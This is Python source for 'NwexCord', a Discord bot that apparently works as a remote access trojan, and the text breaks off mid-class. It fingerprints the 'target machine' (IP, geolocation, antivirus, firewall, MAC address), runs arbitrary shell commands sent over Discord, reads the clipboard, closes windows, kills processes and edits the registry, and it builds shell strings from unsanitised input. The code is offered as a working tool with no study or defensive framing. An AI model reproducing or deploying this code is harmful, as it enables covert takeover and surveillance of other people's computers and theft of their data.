#!/usr/bin/env python3
"""
NwexCord - Discord Interactive Shell Bot
A tool for executing shell commands via Discord messages
"""

import discord
from discord.ext import commands, tasks
import subprocess
import os
import sys
from datetime import datetime
import platform
import uuid
import ctypes
import locale
import webbrowser
import threading
import base64
import asyncio
import io
import tempfile
import time
import config

def get_sys_info():
    info = {}
    
    info["IP"] = "Unknown"
    info["Location"] = "Unknown"
    try:
        import urllib.request, json
        req = urllib.request.Request("http://ip-api.com/json", headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=5) as response:
            data = json.loads(response.read().decode())
            info["IP"] = data.get("query", "Unknown")
            info["Location"] = f"{data.get('city', 'Unknown')}, {data.get('regionName', 'Unknown')}, {data.get('country', 'Unknown')}"
    except Exception:
        pass
    
    info["UserName"] = os.getlogin()
    info["PCName"] = platform.node()
    info["OS"] = f"Microsoft {platform.system()} {platform.release()} {platform.machine()}"
    info["Platform"] = f"Win{platform.release()}" if platform.system() == "Windows" else platform.system()
    info["Ver"] = platform.version()
    
    info["Client"] = os.path.abspath(__file__)
    info["Process"] = os.path.basename(sys.executable)
    info["DateTime"] = datetime.now().strftime("%Y.%m.%d %H:%M:%S")
    
    info["GPU"] = "Unknown"
    info["CPU"] = platform.processor()
    try:
        gpu_req = subprocess.check_output("wmic path win32_VideoController get name", shell=True, stderr=subprocess.DEVNULL).decode().split('\n')[1].strip()
        if gpu_req: info["GPU"] = gpu_req
        cpu_req = subprocess.check_output("wmic cpu get name", shell=True, stderr=subprocess.DEVNULL).decode().split('\n')[1].strip()
        if cpu_req: info["CPU"] = cpu_req
    except: pass
        
    info["Identifier"] = platform.processor()
    
    info["Ram"] = "Unknown"
    try:
        total_ram = int(subprocess.check_output("wmic computersystem get TotalPhysicalMemory", shell=True, stderr=subprocess.DEVNULL).decode().split('\n')[1].strip())
        info["Ram"] = f"{total_ram / (1024**3):.2f} GB"
    except: pass
        
    info["LastReboot"] = "Unknown"
    try:
        boot_str = subprocess.check_output("wmic os get lastbootuptime", shell=True, stderr=subprocess.DEVNULL).decode().split('\n')[1].strip().split('.')[0]
        boot_time = datetime.strptime(boot_str, "%Y%m%d%H%M%S")
        hours_ago = int((datetime.now() - boot_time).total_seconds() / 3600)
        info["LastReboot"] = f"{hours_ago} hour(s) ago"
    except: pass
        
    info["Antivirus"] = "Unknown"
    try:
        av = subprocess.check_output("powershell \"Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object -ExpandProperty displayName\"", shell=True, stderr=subprocess.DEVNULL).decode().strip().split('\n')[0].strip()
        info["Antivirus"] = av if av else "Windows Defender"
    except: pass
        
    info["Firewall"] = "Unknown"
    try:
        fw = subprocess.check_output("netsh advfirewall show allprofiles state", shell=True, stderr=subprocess.DEVNULL).decode()
        info["Firewall"] = "Enabled" if "ON" in fw.upper() or "AÇIK" in fw.upper() else "Disabled"
    except: pass
        
    info["MacAddress"] = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1]).upper()
    
    info["DefaultBrowser"] = "Unknown"
    try:
        b_id = subprocess.check_output("reg query \"HKCU\\Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\http\\UserChoice\" /v ProgId", shell=True, stderr=subprocess.DEVNULL).decode()
        for b in ["Chrome", "Firefox", "Edge", "Opera", "Brave"]:
            if b.lower() in b_id.lower():
                info["DefaultBrowser"] = b
                break
    except: pass
        
    info["CurrentLang"] = "Unknown"
    try:
        info["CurrentLang"] = locale.getlocale()[0].split('_')[0].upper()
    except: pass
        
    info[".Net"] = "Unknown"
    try:
        net_v = subprocess.check_output("reg query \"HKLM\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4\\Full\" /v Release", shell=True, stderr=subprocess.DEVNULL).decode()
        info[".Net"] = "v4.0+" if "Release" in net_v else "v4.0"
    except: pass
        
    info["Battery"] = "Unknown"
    class SYSTEM_POWER_STATUS(ctypes.Structure):
        _fields_ = [('AC', ctypes.c_byte), ('BatFlag', ctypes.c_byte), ('BatLife', ctypes.c_byte), ('SysStat', ctypes.c_byte), ('BatLifeTime', ctypes.c_ulong), ('BatFullLifeTime', ctypes.c_ulong)]
    p_stat = SYSTEM_POWER_STATUS()
    if ctypes.windll.kernel32.GetSystemPowerStatus(ctypes.byref(p_stat)):
        info["Battery"] = "No Battery (Desktop)" if p_stat.BatFlag == 128 else f"{p_stat.BatLife}%"

    return info

# Bot setup
intents = discord.Intents.default()
intents.message_content = True  # Required to read message content

bot = commands.Bot(command_prefix=config.PREFIX, intents=intents)

class ShellExecutor:
    @staticmethod
    def execute(command: str):
        """Executes a system command and returns the output"""
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30,
                encoding='utf-8',
                errors='replace'
            )
            return {
                "success": result.returncode == 0,
                "stdout": result.stdout,
                "stderr": result.stderr,
                "return_code": result.returncode
            }
        except Exception as e:
            return {
                "success": False,
                "stdout": "",
                "stderr": str(e),
                "return_code": -1
            }

# ========================================
# Tools System
# ========================================

TOOL_COMMANDS = {

    "service": {
        "title": "🔧 Service Manager",
        "cmd": 'powershell "Get-Service | Where-Object {$_.Status -eq \'Running\'} | Select-Object -First 25 Status, Name, DisplayName | Format-Table -AutoSize"',
        "description": "Running services (first 25)"
    },
    "clipboard": {
        "title": "📋 Clipboard Manager",
        "cmd": 'powershell "Get-Clipboard"',
        "description": "Current clipboard content"
    },

}

async def run_tool(interaction: discord.Interaction, tool_key: str):
    """Execute a tool command and edit the current message with the result."""
    tool = TOOL_COMMANDS[tool_key]
    
    # Show loading state by editing the message
    loading_embed = discord.Embed(
        title=f"⏳ {tool['title']}",
        description=f"*{tool['description']}*\n\n⏳ Executing...",
        color=discord.Color.greyple()
    )
    loading_embed.set_footer(text="NwexCord • Tools")
    await interaction.response.edit_message(content=None, embed=loading_embed, view=None)
    
    result = ShellExecutor.execute(tool["cmd"])
    
    output = result["stdout"] if result["stdout"] else result["stderr"]
    if not output:
        output = "No output."
    
    # Discord embed description limit is 4096
    if len(output) > 3800:
        output = output[:3800] + "\n...(truncated)..."
    
    color = discord.Color.green() if result["success"] else discord.Color.red()
    
    embed = discord.Embed(
        title=tool["title"],
        description=f"*{tool['description']}*\n```\n{output}\n```",
        color=color,
        timestamp=datetime.utcnow()
    )
    embed.set_footer(text="NwexCord • Tools")
    
    view = ToolResultView(tool_key)
    await interaction.edit_original_response(content=None, embed=embed, view=view)


class ToolResultView(discord.ui.View):
    """View shown after a tool executes, with Refresh and Back buttons."""
    def __init__(self, tool_key: str):
        super().__init__(timeout=300)
        self.tool_key = tool_key
    
    @discord.ui.button(label="Refresh", emoji="🔄", style=discord.ButtonStyle.success, row=0)
    async def refresh_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await run_tool(interaction, self.tool_key)
    
    @discord.ui.button(label="Back to Tools", emoji="⬅", style=discord.ButtonStyle.secondary, row=0)
    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        tools_embed = discord.Embed(
            title="🧰 NwexCord Tools",
            description="Select a tool from the buttons below to execute it on the target machine.",
            color=discord.Color.blurple()
        )
        tools_embed.set_footer(text="NwexCord • Tools Panel")
        await interaction.response.edit_message(content=None, embed=embed_tools_panel(), view=ToolsPanelView())


def embed_tools_panel():
    """Create the tools panel embed."""
    embed = discord.Embed(
        title="🧰 NwexCord Tools",
        description="Select a tool from the buttons below to execute it on the target machine.",
        color=discord.Color.blurple()
    )
    embed.set_footer(text="NwexCord • Tools Panel")
    return embed


# ========================================
# Interactive ActiveWindows UI
# ========================================

class ActiveWindowsManager:
    """Helper class to enumerate visible windows using ctypes."""
    
    @staticmethod
    def get_windows():
        """Returns a list of dicts with 'title' and 'handle' for all visible windows."""
        import ctypes
        from ctypes import wintypes
        
        user32 = ctypes.windll.user32
        EnumWindows = user32.EnumWindows
        EnumWindowsProc = ctypes.WINFUNCTYPE(ctypes.c_bool, wintypes.HWND, wintypes.LPARAM)
        GetWindowTextW = user32.GetWindowTextW
        GetWindowTextLengthW = user32.GetWindowTextLengthW
        IsWindowVisible = user32.IsWindowVisible
        
        windows = []
        
        def callback(hwnd, lparam):
            if IsWindowVisible(hwnd):
                length = GetWindowTextLengthW(hwnd)
                if length > 0:
                    buf = ctypes.create_unicode_buffer(length + 1)
                    GetWindowTextW(hwnd, buf, length + 1)
                    title = buf.value.strip()
                    if title:
                        windows.append({"title": title, "handle": hwnd})
            return True
        
        EnumWindows(EnumWindowsProc(callback), 0)
        return windows
    
    @staticmethod
    def close_window(hwnd: int):
        """Send WM_CLOSE to a window handle."""
        import ctypes
        WM_CLOSE = 0x0010
        try:
            ctypes.windll.user32.PostMessageW(hwnd, WM_CLOSE, 0, 0)
            return True, "Window close signal sent."
        except Exception as e:
            return False, str(e)


def build_activewindows_embed(session_id: str, selected_idx: int = -1):
    """Build the ActiveWindows embed with a table-style layout."""
    windows = ActiveWindowsManager.get_windows()
    
    # Build table header
    header = f"{'[ ActiveWindow ]':<42} {'[ Handle ]':>10}"
    sep = "━" * 54
    
    # Build rows
    rows = ""
    for i, w in enumerate(windows):
        title = w['title']
        if len(title) > 38:
            title = title[:35] + "..."
        handle_str = str(w['handle'])
        
        # Mark selected row
        if i == selected_idx:
            marker = "►"
        else:
            marker = " "
        
        icon = "🪟"
        rows += f"{marker} {icon} {title:<38} {handle_str:>10}\n"
    
    if not windows:
        rows = "  (No visible windows found)\n"
    
    table_block = f"```\n{header}\n{sep}\n{rows}```"
    
    # Truncate if too long for embed
    if len(table_block) > 4000:
        table_block = table_block[:3990] + "\n...```"
    
    selected_count = 1 if selected_idx >= 0 else 0
    
    embed = discord.Embed(
        title=f"🪟 ActiveWindows : {session_id}",
        description=table_block,
        color=discord.Color.from_rgb(0, 120, 215)
    )
    embed.set_footer(text=f"Selected [{selected_count}]  Windows [{len(windows)}]")
    
    return embed, windows


class ActiveWindowsSelect(discord.ui.Select):
    """Dropdown to select a window from the list."""
    def __init__(self, windows: list, session_id: str):
        self.session_id = session_id
        self.windows_data = windows
        
        if windows:
            options = []
            for i, w in enumerate(windows[:25]):  # Discord max 25 options
                label = w['title'][:100] if len(w['title']) > 100 else w['title']
                options.append(discord.SelectOption(
                    label=label,
                    description=f"Handle: {w['handle']}",
                    value=str(i),
                    emoji="🪟"
                ))
        else:
            options = [discord.SelectOption(label="(no windows)", value="_none")]
        
        super().__init__(placeholder="🪟 Select a window...", options=options, row=0)
    
    async def callback(self, interaction: discord.Interaction):
        selected = self.values[0]
        if selected == "_none":
            await interaction.response.defer()
            return
        
        idx = int(selected)
        embed, windows = build_activewindows_embed(self.session_id, selected_idx=idx)
        view = ActiveWindowsView(self.session_id, selected_idx=idx)
        await interaction.response.edit_message(embed=embed, view=view)


class ActiveWindowsView(discord.ui.View):
    """Interactive view for ActiveWindows with Refresh and Close buttons."""
    def __init__(self, session_id: str, selected_idx: int = -1):
        super().__init__(timeout=300)
        self.session_id = session_id
        self.selected_idx = selected_idx
        
        # Get current windows for the dropdown
        windows = ActiveWindowsManager.get_windows()
        self.windows_data = windows
        
        # Add select dropdown
        self.add_item(ActiveWindowsSelect(windows, session_id))
    
    @discord.ui.button(label="Refresh", emoji="🔄", style=discord.ButtonStyle.success, row=1)
    async def refresh_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        embed, windows = build_activewindows_embed(self.session_id)
        view = ActiveWindowsView(self.session_id)
        await interaction.response.edit_message(content=None, embed=embed, view=view)
    
    @discord.ui.button(label="Close", emoji="❌", style=discord.ButtonStyle.danger, row=1)
    async def close_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.selected_idx < 0 or self.selected_idx >= len(self.windows_data):
            await interaction.response.send_message("❌ Please select a window first!", ephemeral=True)
            return
        
        target = self.windows_data[self.selected_idx]
        success, msg = ActiveWindowsManager.close_window(target['handle'])
        
        # After closing, refresh the window list in the same message
        embed, windows = build_activewindows_embed(self.session_id)
        
        # Add status info to embed
        if success:
            embed.add_field(name="✅ Closed", value=f"`{target['title']}`", inline=False)
        else:
            embed.add_field(name="❌ Failed", value=f"`{target['title']}` — {msg}", inline=False)
        
        view = ActiveWindowsView(self.session_id)
        await interaction.response.edit_message(content=None, embed=embed, view=view)
    
    @discord.ui.button(label="Back to Tools", emoji="⬅", style=discord.ButtonStyle.secondary, row=1)
    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=embed_tools_panel(), view=ToolsPanelView())


# ========================================
# Interactive TCP Connections UI
# ========================================

class TCPConnectionsManager:
    """Helper class to get TCP connection data via netstat."""
    
    STATE_ICONS = {
        "ESTABLISHED": "\ud83d\udfe2",
        "LISTENING": "\ud83d\udd35",
        "TIME_WAIT": "\ud83d\udfe1",
        "CLOSE_WAIT": "\ud83d\udfe0",
        "FIN_WAIT_1": "\ud83d\udfe3",
        "FIN_WAIT_2": "\ud83d\udfe3",
        "SYN_SENT": "\u26aa",
        "SYN_RECEIVED": "\u26aa",
        "LAST_ACK": "\ud83d\udd34",
        "CLOSING": "\ud83d\udd34",
        "CLOSED": "\u26ab",
    }
    
    @staticmethod
    def get_connections():
        """Parse netstat -ano output into structured data."""
        try:
            result = subprocess.run(
                'netstat -ano',
                shell=True, capture_output=True, text=True,
                timeout=15, encoding='utf-8', errors='replace'
            )
            connections = []
            for line in result.stdout.strip().split('\n'):
                line = line.strip()
                if not line or line.startswith('Active') or line.startswith('Proto'):
                    continue
                parts = line.split()
                if len(parts) >= 4 and parts[0] == 'TCP':
                    conn = {
                        "local": parts[1],
                        "remote": parts[2],
                        "state": parts[3] if len(parts) > 3 else "UNKNOWN",
                        "pid": parts[4] if len(parts) > 4 else "0",
                    }
                    connections.append(conn)
            return connections
        except Exception:
            return []
    
    @staticmethod
    def close_connection(pid: str):
        """Kill the process associated with a TCP connection given its PID."""
        if not pid or pid == "0":
            return False, "Cannot close a connection with PID 0 (System process)."
        try:
            result = subprocess.run(
                f'taskkill /F /PID {pid}',
                shell=True, capture_output=True, text=True,
                timeout=10, encoding='utf-8', errors='replace'
            )
            if result.returncode == 0:
                return True, "Process terminated successfully."
            else:
                return False, result.stderr.strip() or "Failed to terminate process."
        except Exception as e:
            return False, str(e)


def build_tcp_embed(session_id: str, page: int = 0, connections: list = None, selected_idx: int = -1):
    """Build the TCP Connections embed with table layout and pagination."""
    if connections is None:
        connections = TCPConnectionsManager.get_connections()
    
    per_page = 15
    total = len(connections)
    total_pages = max(1, (total + per_page - 1) // per_page)
    page = max(0, min(page, total_pages - 1))
    
    start = page * per_page
    end = min(start + per_page, total)
    page_conns = connections[start:end]
    
    # Build table
    header = f"{'[PID]':<8} {'[LocalAddress]':<24} {'[RemoteAddress]':<24} {'[State]'}"
    sep = "\u2501" * 72
    
    rows = ""
    for c in page_conns:
        icon = TCPConnectionsManager.STATE_ICONS.get(c['state'], "\u26ab")
        pid = c['pid'][:6]
        local = c['local'][:22]
        remote = c['remote'][:22]
        state = c['state']
        rows += f"{icon} {pid:<6} {local:<22} {remote:<22} {state}\n"
    
    if not connections:
        rows = "  (No TCP connections found)\n"
    
    table_block = f"```\n{header}\n{sep}\n{rows}```"
    
    if len(table_block) > 4000:
        table_block = table_block[:3990] + "\n...```"
    
    embed = discord.Embed(
        title=f"\ud83c\udf10 TCP Connections : {session_id}",
        description=table_block,
        color=discord.Color.from_rgb(0, 120, 215)
    )
    selected_count = 1 if selected_idx >= 0 else 0
    embed.set_footer(text=f"Page [{page+1}/{total_pages}]  Selected [{selected_count}]  Connections [{total}]")
    
    return embed, connections, page, total_pages


class TCPConnectionsSelect(discord.ui.Select):
    """Dropdown to select a connection from the current page."""
    def __init__(self, session_id: str, page: int, connections: list):
        self.session_id = session_id
        self.page = page
        self.connections_data = connections
        
        per_page = 15
        start = page * per_page
        end = min(start + per_page, len(connections))
        page_conns = connections[start:end]
        
        if page_conns:
            options = []
            for i, c in enumerate(page_conns):
                overall_idx = start + i
                label = f"PID: {c['pid']} | {c['local']} -> {c['remote']}"
                label = label[:100]
                status_emoji = TCPConnectionsManager.STATE_ICONS.get(c['state'], "⚫")
                options.append(discord.SelectOption(
                    label=label,
                    description=f"State: {c['state']}",
                    value=str(overall_idx),
                    emoji=status_emoji
                ))
        else:
            options = [discord.SelectOption(label="(no connections)", value="_none")]
        
        super().__init__(placeholder="🌐 Select a connection to manage...", options=options, row=0)
    
    async def callback(self, interaction: discord.Interaction):
        selected = self.values[0]
        if selected == "_none":
            await interaction.response.defer()
            return
        
        idx = int(selected)
        embed, conns, pg, tp = build_tcp_embed(self.session_id, self.page, self.connections_data, selected_idx=idx)
        view = TCPConnectionsView(self.session_id, pg, self.connections_data, selected_idx=idx)
        await interaction.response.edit_message(content=None, embed=embed, view=view)


class TCPConnectionsView(discord.ui.View):
    """Interactive view for TCP Connections with pagination."""
    def __init__(self, session_id: str, page: int = 0, connections: list = None, selected_idx: int = -1):
        super().__init__(timeout=300)
        self.session_id = session_id
        self.page = page
        self.selected_idx = selected_idx
        self.connections = connections if connections is not None else TCPConnectionsManager.get_connections()
        self.total_pages = max(1, (len(self.connections) + 14) // 15)
        
        # Add select dropdown on row 0
        self.add_item(TCPConnectionsSelect(session_id, page, self.connections))
    
    @discord.ui.button(label="\u25c0", style=discord.ButtonStyle.secondary, row=1)
    async def prev_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        new_page = max(0, self.page - 1)
        embed, conns, pg, tp = build_tcp_embed(self.session_id, new_page, self.connections)
        view = TCPConnectionsView(self.session_id, pg, self.connections)
        await interaction.response.edit_message(content=None, embed=embed, view=view)
    
    @discord.ui.button(label="\u25b6", style=discord.ButtonStyle.secondary, row=1)
    async def next_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        new_page = min(self.total_pages - 1, self.page + 1)
        embed, conns, pg, tp = build_tcp_embed(self.session_id, new_page, self.connections)
        view = TCPConnectionsView(self.session_id, pg, self.connections)
        await interaction.response.edit_message(content=None, embed=embed, view=view)
    
    @discord.ui.button(label="Refresh", emoji="\ud83d\udd04", style=discord.ButtonStyle.success, row=1)
    async def refresh_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        new_conns = TCPConnectionsManager.get_connections()
        embed, conns, pg, tp = build_tcp_embed(self.session_id, 0, new_conns)
        view = TCPConnectionsView(self.session_id, 0, new_conns)
        await interaction.response.edit_message(content=None, embed=embed, view=view)
        
    @discord.ui.button(label="Close", emoji="\u274c", style=discord.ButtonStyle.danger, row=1)
    async def close_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.selected_idx < 0 or self.selected_idx >= len(self.connections):
            await interaction.response.send_message("\u274c Please select a connection first!", ephemeral=True)
            return
            
        target = self.connections[self.selected_idx]
        success, msg = TCPConnectionsManager.close_connection(target['pid'])
        
        # After closing, refresh the connection list in the same message
        new_conns = TCPConnectionsManager.get_connections()
        
        # Adjust page if necessary
        per_page = 15
        total = len(new_conns)
        total_pages = max(1, (total + per_page - 1) // per_page)
        page = max(0, min(self.page, total_pages - 1))
        
        embed, conns, pg, tp = build_tcp_embed(self.session_id, page, new_conns)
        
        if success:
            embed.add_field(name="\u2705 Terminated", value=f"`PID: {target['pid']}`", inline=False)
        else:
            embed.add_field(name="\u274c Failed", value=f"`PID: {target['pid']}` \u2014 {msg}", inline=False)
            
        view = TCPConnectionsView(self.session_id, pg, new_conns)
        await interaction.response.edit_message(content=None, embed=embed, view=view)
    
    @discord.ui.button(label="Back to Tools", emoji="\u2b05", style=discord.ButtonStyle.secondary, row=1)
    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=embed_tools_panel(), view=ToolsPanelView())


# ========================================
# Interactive Registry Editor
# ========================================

import hashlib

ROOT_HIVES = [
    "HKEY_CLASSES_ROOT",
    "HKEY_CURRENT_USER",
    "HKEY_LOCAL_MACHINE",
    "HKEY_USERS",
]

class RegistryEditor:
    """Helper class to interact with the Windows Registry via reg.exe."""
    
    @staticmethod
    def get_subkeys(path: str):
        """Get subkeys of a registry path."""
        try:
            result = subprocess.run(
                f'reg query "{path}"', shell=True,
                capture_output=True, text=True, timeout=10,
                encoding='utf-8', errors='replace'
            )
            subkeys = []
            for line in result.stdout.strip().split('\n'):
                line = line.strip()
                if line and line.startswith(path + "\\"):
                    subkey_name = line[len(path)+1:]
                    if "\\" not in subkey_name:
                        subkeys.append(subkey_name)
            return subkeys
        except:
            return []
    
    @staticmethod
    def get_values(path: str):
        """Get values (name, type, data) of a registry key."""
        try:
            result = subprocess.run(
                f'reg query "{path}" /v *', shell=True,
                capture_output=True, text=True, timeout=10,
                encoding='utf-8', errors='replace'
            )
            values = []
            for line in result.stdout.strip().split('\n'):
                line = line.strip()
                if not line or line.startswith("HKEY") or line.startswith("End"):
                    continue
                parts = line.split(None, 2)
                if len(parts) >= 3:
                    values.append({
                        "name": parts[0],
                        "type": parts[1],
                        "data": parts[2]
                    })
                elif len(parts) == 2:
                    values.append({
                        "name": parts[0],
                        "type": parts[1],
                        "data": ""
                    })
            return values
        except:
            return []
    
    @staticmethod
    def add_value(path: str, name: str, reg_type: str, data: str):
        """Add or set a registry value."""
        try:
            result = subprocess.run(
                f'reg add "{path}" /v "{name}" /t {reg_type} /d "{data}" /f',
                shell=True, capture_output=True, text=True, timeout=10,
                encoding='utf-8', errors='replace'
            )
            return result.returncode == 0, result.stdout.strip() + result.stderr.strip()
        except Exception as e:
            return False, str(e)
    
    @staticmethod
    def delete_value(path: str, name: str):
        """Delete a registry value."""
        try:
            if name.lower() == "(default)":
                cmd = f'reg delete "{path}" /ve /f'
            else:
                cmd = f'reg delete "{path}" /v "{name}" /f'
            result = subprocess.run(
                cmd,
                shell=True, capture_output=True, text=True, timeout=10,
                encoding='utf-8', errors='replace'
            )
            return result.returncode == 0, result.stdout.strip() + result.stderr.strip()
        except Exception as e:
            return False, str(e)


def build_registry_embed(current_path: str, session_id: str):
    """Build the registry editor embed for a given path."""
    parts = current_path.split("\\") if current_path else []
    
    # Build tree view
    tree = ""
    if not current_path:
        for hive in ROOT_HIVES:
            tree += f"  📁 {hive}\n"
    else:
        for i, part in enumerate(parts):
            prefix = "┣ " if i < len(parts) - 1 else "┗ "
            indent = "┃ " * i
            icon = "📂" if i == len(parts) - 1 else "📁"
            bold = f"**{part}**" if i == len(parts) - 1 else part
            tree += f"{indent}{prefix}{icon} {bold}\n"
        
        subkeys = RegistryEditor.get_subkeys(current_path)
        indent = "┃ " * len(parts)
        for sk in subkeys[:12]:
            tree += f"{indent}┣ 📁 {sk}\n"
        if len(subkeys) > 12:
            tree += f"{indent}┗ *...+{len(subkeys)-12} more*\n"
    
    # Build values table as a monospace code block
    values_block = ""
    val_count = 0
    if current_path:
        values = RegistryEditor.get_values(current_path)
        val_count = len(values)
        if values:
            # Calculate column widths
            names = [v['name'][:18] for v in values[:10]]
            types = [v['type'][:14] for v in values[:10]]
            datas = [v['data'][:22] for v in values[:10]]
            
            nw = max(max(len(n) for n in names), 4) + 1
            tw = max(max(len(t) for t in types), 4) + 1
            
            header = f"{'Name':<{nw}} {'Type':<{tw}} Value"
            sep = "─" * (nw + tw + 20)
            values_block = f"```\n{header}\n{sep}\n"
            
            for i in range(len(names)):
                values_block += f"{names[i]:<{nw}} {types[i]:<{tw}} {datas[i]}\n"
            
            if val_count > 10:
                values_block += f"... +{val_count - 10} more values\n"
            values_block += "```"
        else:
            values_block = "```\nNo values in this key.\n```"
    else:
        values_block = "```\nSelect a hive to view values.\n```"
    
    subkey_count = len(RegistryEditor.get_subkeys(current_path)) if current_path else len(ROOT_HIVES)
    
    embed = discord.Embed(
        title=f"🔑 Registry Editor : {session_id[:20]}",
        color=discord.Color.from_rgb(30, 30, 30)
    )
    embed.add_field(name="🗂️ Tree", value=tree[:1024] if tree else "Empty", inline=False)
    embed.add_field(name=f"📄 Values [{val_count}]", value=values_block[:1024], inline=False)
    embed.set_footer(text=f"Keys [{subkey_count}] | Path: {current_path or 'Root'}")
    
    return embed


class NewValueModal(discord.ui.Modal, title="Add New Registry Value"):
    """Modal for adding a new registry value."""
    val_name = discord.ui.TextInput(label="Value Name", placeholder="MyValue", required=True)
    val_type = discord.ui.TextInput(label="Type", placeholder="REG_SZ, REG_DWORD, REG_QWORD...", default="REG_SZ", required=True)
    val_data = discord.ui.TextInput(label="Data", placeholder="Enter value data", required=True)
    
    def __init__(self, reg_path: str, session_id: str, page: int = 0):
        super().__init__()
        self.reg_path = reg_path
        self.session_id = session_id
        self.page = page
    
    async def on_submit(self, interaction: discord.Interaction):
        success, msg = RegistryEditor.add_value(
            self.reg_path, str(self.val_name), str(self.val_type), str(self.val_data)
        )
        status = "✅ Value added!" if success else f"❌ Error: {msg}"
        embed = build_registry_embed(self.reg_path, self.session_id)
        view = RegistryView(self.reg_path, self.session_id, page=self.page)
        await interaction.response.edit_message(content=status, embed=embed, view=view)


class EditValueModal(discord.ui.Modal, title="Edit Registry Value"):
    """Modal for editing a registry value (pre-filled)."""
    val_name = discord.ui.TextInput(label="Value Name", required=True)
    val_type = discord.ui.TextInput(label="Type", placeholder="REG_SZ, REG_DWORD...", default="REG_SZ", required=True)
    val_data = discord.ui.TextInput(label="New Data", placeholder="New value data", required=True)
    
    def __init__(self, reg_path: str, session_id: str, prefill_name: str = "", prefill_type: str = "REG_SZ", prefill_data: str = "", page: int = 0):
        super().__init__()
        self.reg_path = reg_path
        self.session_id = session_id
        self.page = page
        self.original_name = prefill_name  # Store original name to detect renames
        self.val_name.default = prefill_name
        self.val_type.default = prefill_type
        self.val_data.default = prefill_data[:100]
    
    async def on_submit(self, interaction: discord.Interaction):
        try:
            new_name = str(self.val_name).strip()
            reg_type = str(self.val_type).strip().upper()
            data = str(self.val_data).strip()
            
            # If name changed, delete old value first
            renamed = new_name != self.original_name
            if renamed:
                RegistryEditor.delete_value(self.reg_path, self.original_name)
            
            success, msg = RegistryEditor.add_value(self.reg_path, new_name, reg_type, data)
            
            color = discord.Color.green() if success else discord.Color.red()
            status_icon = "✅" if success else "❌"
            
            desc = f"**Name:** `{new_name}`\n**Type:** `{reg_type}`\n**Data:** `{data}`\n\n**Result:** {msg}"
            if renamed:
                desc = f"**Renamed:** `{self.original_name}` → `{new_name}`\n" + desc
            
            result_embed = discord.Embed(
                title=f"{status_icon} Edit Value",
                description=desc,
                color=color
            )
            result_embed.set_footer(text=f"Path: {self.reg_path}")
            await interaction.response.send_message(embed=result_embed, ephemeral=True)
        except Exception as e:
            try:
                await interaction.response.send_message(f"❌ Unexpected error: {e}", ephemeral=True)
            except Exception:
                await interaction.followup.send(f"❌ Unexpected error: {e}", ephemeral=True)
    
    async def on_error(self, interaction: discord.Interaction, error: Exception):
        try:
            await interaction.response.send_message(f"❌ Modal error: {error}", ephemeral=True)
        except Exception:
            await interaction.followup.send(f"❌ Modal error: {error}", ephemeral=True)


class RegistryNavSelect(discord.ui.Select):
    """Dropdown to navigate into subkeys (paginated, 24 per page)."""
    def __init__(self, current_path: str, session_id: str, page: int = 0):
        self.current_path = current_path
        self.session_id = session_id
        self.page = page
        
        if not current_path:
            options = [discord.SelectOption(label=h, emoji="📁") for h in ROOT_HIVES]
        else:
            all_subkeys = RegistryEditor.get_subkeys(current_path)
            start = page * 24
            end = start + 24
            page_keys = all_subkeys[start:end]
            total_pages = max(1, (len(all_subkeys) + 23) // 24)
            
            if page_keys:
                options = [discord.SelectOption(label=sk[:100], emoji="📁") for sk in page_keys]
                if total_pages > 1:
                    options.append(discord.SelectOption(
                        label=f"Page {page+1}/{total_pages} ({len(all_subkeys)} keys)",
                        value="_pageinfo", emoji="📄"
                    ))
            else:
                options = [discord.SelectOption(label="(no subkeys)", value="_none")]
        
        super().__init__(placeholder="📂 Navigate to subkey...", options=options, row=0)
    
    async def callback(self, interaction: discord.Interaction):
        selected = self.values[0]
        if selected in ("_none", "_pageinfo"):
            await interaction.response.defer()
            return
        new_path = f"{self.current_path}\\{selected}" if self.current_path else selected
        embed = build_registry_embed(new_path, self.session_id)
        view = RegistryView(new_path, self.session_id, page=0)
        await interaction.response.edit_message(content=None, embed=embed, view=view)


class RegistryValSelect(discord.ui.Select):
    """Dropdown to select a value for viewing/editing/deleting."""
    def __init__(self, current_path: str, session_id: str, page: int = 0):
        self.current_path = current_path
        self.session_id = session_id
        self.page = page
        
        values = RegistryEditor.get_values(current_path) if current_path else []
        if values:
            options = []
            seen_values = set()
            for i, v in enumerate(values[:25]):
                data_preview = (v['data'][:45] if v['data'] else "(empty)")
                # Use index prefix to guarantee unique option values
                unique_val = f"{i}:{v['name'][:95]}"
                seen_values.add(unique_val)
                options.append(discord.SelectOption(
                    label=v['name'][:100],
                    description=f"{v['type']} = {data_preview}"[:100],
                    value=unique_val,
                    emoji="📝"
                ))
        else:
            options = [discord.SelectOption(label="(no values)", value="_none")]
        
        super().__init__(placeholder="📝 Select a value to manage...", options=options, row=1)
    
    async def callback(self, interaction: discord.Interaction):
        selected = self.values[0]
        if selected == "_none":
            await interaction.response.defer()
            return
        
        # Parse index from unique value "idx:name"
        idx_str, val_name = selected.split(":", 1)
        idx = int(idx_str)
        
        values = RegistryEditor.get_values(self.current_path)
        found = values[idx] if idx < len(values) else None
        
        if not found:
            await interaction.response.send_message("❌ Value not found.", ephemeral=True)
            return
        
        detail_embed = discord.Embed(
            title=f"📝 Value: {found['name']}",
            color=discord.Color.from_rgb(50, 50, 80)
        )
        detail_embed.add_field(name="Name", value=f"`{found['name']}`", inline=True)
        detail_embed.add_field(name="Type", value=f"`{found['type']}`", inline=True)
        detail_embed.add_field(name="Data", value=f"```\n{found['data'][:500]}\n```", inline=False)
